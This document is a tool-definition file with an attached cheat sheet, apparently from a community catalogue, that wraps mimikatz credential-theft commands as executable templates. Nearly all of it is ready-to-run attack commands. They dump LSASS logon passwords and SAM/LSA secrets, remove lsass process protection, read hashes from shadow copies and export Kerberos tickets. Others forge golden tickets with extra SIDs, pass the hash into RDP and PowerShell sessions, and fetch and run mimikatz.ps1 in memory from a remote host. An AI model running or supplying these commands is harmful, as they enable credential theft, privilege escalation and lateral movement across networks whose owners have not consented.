---
trust_level: community
id: darkiros-mimikatz
namespace: darkiros:tool:mimikatz
name: "mimikatz"
description: "mimikatz one liner"
version: "1.0.0"
capabilities:
  - credential.dump.generic
  - network.pivot.generic
platforms:
  - windows
  - linux
techniques:
  - credential-access
  - lateral-movement
execution:
  template: "mimikatz"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
  - description: "mimikatz one liner"
    command: "mimikatz.exe \\\"privilege::debug\\\" \\\"token::elevate\\\" \\\"sekurlsa::logonpasswords\\\" \\\"lsadump::sam\\\" \\\"exit\\\""
  - description: "load mimikatz in memory"
    command: "powershell -nop -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://[ip]/mimikatz.ps1')\\\""
  - description: "mimikatz disable ppl and dump password"
    command: "mimikatz.exe \\\"privilege::debug\\\" \\\"!+\\\" \\\"!processprotect /process:lsass.exe /remove\\\" \\\"sekurlsa::logonpasswords\\\" \\\"exit\\\""
  - description: "mimikatz extract credentials from dump"
    command: "mimikatz.exe \\\"privilege::debug\\\" \\\"sekurlsa::minidump lsass.dmp\\\" \\\"sekurlsa::logonPasswords\\\" \\\"exit\\\""
  - description: "mimikatz extract credentials from shadow copy (1)"
    command: "mimikatz.exe \\\"lsadump::sam /system:\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\\\\Windows\\\\System32\\\\config\\\\SYSTEM /security:\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\\\\Windows\\\\System32\\\\config\\\\SECURITY /sam:\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\\\\Windows\\\\System32\\\\config\\\\SAM\\\""
  - description: "mimikatz extract credentials from shadow copy (2)"
    command: "mimikatz.exe \\\"lsadump::secrets /system:\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\\\\Windows\\\\System32\\\\config\\\\SYSTEM /security:\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\\\\Windows\\\\System32\\\\config\\\\SECURITY\\\""
  - description: "mimikatz extract tickets"
    command: "mimikatz.exe \\\"sekurlsa::tickets /export\\\" \\\"exit\\\""
  - description: "mimikatz - forest extra SID"
    command: "kerberos::golden /user:[user] /domain:[domain] /sid:[child_sid] /krbtgt:[krbtgt_ntlm] /sids:[parent_sid]-519 /ptt"
  - description: "mimikatz pth to RDP mstsc.exe"
    command: "sekurlsa::pth /user:[user] /domain:<domain> /ntlm:<ntlm_hash> /run:\\\"mstsc.exe /restrictedadmin\\\""
  - description: "mimikatz pth run powershell remotelly"
    command: "sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[ntlm_hash] /run:\\\"powershell.exe -exec bypass\\\""
references:
  - label: "Source"
    url: "https://github.com/gentilkiwi/mimikatz"
  - label: "Darkiros"
    url: "https://darkiros.github.io/commands.html"
items:
  - Password
  - Hash
  - TGS
  - TGT
services:
  - Kerberos
  - LDAP
  - SMB
---

# mimikatz

Darkiros cheat sheet commands:

**mimikatz one liner**
```
mimikatz.exe \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"exit\"
```

**load mimikatz in memory**
```
powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://[ip]/mimikatz.ps1')\"
```

**mimikatz disable ppl and dump password**
```
mimikatz.exe \"privilege::debug\" \"!+\" \"!processprotect /process:lsass.exe /remove\" \"sekurlsa::logonpasswords\" \"exit\"
```

**mimikatz extract credentials from dump**
```
mimikatz.exe \"privilege::debug\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords\" \"exit\"
```

**mimikatz extract credentials from shadow copy (1)**
```
mimikatz.exe \"lsadump::sam /system:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY /sam:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM\"
```

**mimikatz extract credentials from shadow copy (2)**
```
mimikatz.exe \"lsadump::secrets /system:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY\"
```

**mimikatz extract tickets**
```
mimikatz.exe \"sekurlsa::tickets /export\" \"exit\"
```

**mimikatz - forest extra SID**
```
kerberos::golden /user:[user] /domain:[domain] /sid:[child_sid] /krbtgt:[krbtgt_ntlm] /sids:[parent_sid]-519 /ptt
```

**mimikatz pth to RDP mstsc.exe**
```
sekurlsa::pth /user:[user] /domain:<domain> /ntlm:<ntlm_hash> /run:\"mstsc.exe /restrictedadmin\"
```

**mimikatz pth run powershell remotelly**
```
sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[ntlm_hash] /run:\"powershell.exe -exec bypass\"
```
